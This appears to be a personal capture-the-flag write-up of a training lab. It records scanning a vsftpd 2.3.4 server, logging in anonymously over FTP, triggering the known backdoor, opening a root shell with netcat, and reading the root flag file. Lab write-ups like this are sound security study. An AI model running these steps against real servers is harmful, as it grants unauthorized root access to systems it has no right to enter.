---
dg-publish: true
---
Room Information: A seemingly innocent FTP server harbors a dark secret - a malicious backdoor inserted by attackers who compromised the official distribution. The vulnerability lies dormant, waiting for the right trigger to unleash remote access. 🎯 Time to discover how compromised software can become your gateway to system control!

Link: https://hackerdna.com/labs/anonymous

Steps

1) Browsed to Website to see if any information was available. Website looks normal
2) Ran NMAP Scan
	1) `nmap -sV (Target IP)`
		1) ``` Results
		   21/tcp open  ftp     vsftpd 2.3.4
		   80/tcp open  http    Apache httpd 2.4.65 ((Unix))
		   Service Info: OS: Unix
			```
3) Attempted FTP login using Anonymous Credentials
	1) Successfully logged in 
		1) `ftp 52.215.221.204
		2) Credentials: Anonymous:Anonymous
4) Browsed system files to see what was available
5) Reviewed vuln in vsFTPd version
6) Logged in with specific username to activate backdoor
7) Used NetCat to connect to backdoor
	1) `nc (Target IP) (PORT)`
8) Confirmed root shell
	1) `whoami = root`
9) Searched root directory for flag
	1) `ls /root/`
10) Found flag
	1) `cat /root/flag.txt`

find / -name "*file" 2>/dev/null